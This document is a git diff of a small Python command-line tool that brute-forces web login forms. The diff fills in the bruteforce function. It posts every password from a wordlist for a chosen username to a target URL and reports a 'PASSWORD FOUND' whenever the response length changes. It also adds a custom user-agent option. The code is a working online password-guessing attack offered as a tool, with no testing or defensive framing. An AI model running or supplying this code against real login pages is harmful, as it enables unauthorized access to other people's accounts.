@@ -4,12 +4,14 @@ import argparse
 import sys
 
 
-#const variables
+#gloabal variables
 url      = ""
 username = ""
 wordlist = ""
 ufield   = "username"
 pfield   = "password"
+
+
 
 wlist    = []
 
@@ -19,11 +21,17 @@ def main():
     banner()
     
     parser = argparse.ArgumentParser(description=("CLI Bruteforcer for login fields."))
+    
     parser.add_argument('-u', '--url', nargs='?', help="Set url to bruteforce (needed)")
     parser.add_argument('-w', '--wordlist', nargs='?', help="Path to wordlist (needed)")
     parser.add_argument('--username', nargs='?', help="Username to bruteforce (needed)")
+    
     parser.add_argument('--ufield', nargs='?', help="Username field if different than 'username'")
     parser.add_argument('--pfield', nargs='?', help="Password field if different than 'password'")
+    
+    parser.add_argument('--error', nargs='?')
+    
+    parser.add_argument('--user-agent', nargs='?', help="Set special user-agent")
     
     args = parser.parse_args()
     try:
@@ -44,7 +52,6 @@ def main():
         print("You must provide all needed parameters.")
         parser.print_help()
     
-
 
 def banner():
     print(
@@ -77,9 +84,37 @@ def read_wordlist():
         except:
             raise UnicodeDecodeError
     return wlist
-                
+
+def test_url(url, data):
+    r = requests.post(url, data=data)
+    if r.status_code == 200:
+        return True
+    return False
+
+def calculate_length(url, data):
+    r = requests.post(url, data=data)
+    return len(r.text)
+    
 def bruteforce():
-    pass
+    data = {
+        ufield: username,
+        pfield: "placeholder" 
+    }
+    
+    idx = 0
+    if test_url(url, data):
+        default_len = calculate_length(url, data)
+        for word in wlist:
+            data[pfield] = word
+            r = requests.post(url, data=data)
+            if len(r.text) != default_len:
+                print(f"PASSWORD FOUND : {word}")
+                break
+        print("[~] Done")
+    else:
+        print("[~] URL can't be bruteforced.")
+        
+    
 
 if __name__ == '__main__':
     main()
